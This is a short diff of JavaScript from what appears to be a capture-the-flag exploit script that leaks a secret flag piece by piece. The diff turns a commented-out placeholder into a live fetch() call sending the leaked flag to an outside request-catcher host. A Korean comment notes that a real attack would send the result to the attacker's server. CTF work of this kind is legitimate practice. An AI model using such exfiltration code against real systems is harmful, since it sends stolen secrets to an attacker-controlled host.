@@ -32,7 +32,7 @@
                 if (!foundChar || flag.endsWith("}")) {
                     console.log("Attack finished! Leaked flag:", flag);
                     // 실제 공격에서는 이 결과를 공격자 서버로 전송합니다.
-                    // fetch("https://your-server.com/log?flag=" + flag);
+                    fetch("https://my-ctf-catcher.free.beeceptor.com/log?flag=" + flag);
                     break;
                 }
             }
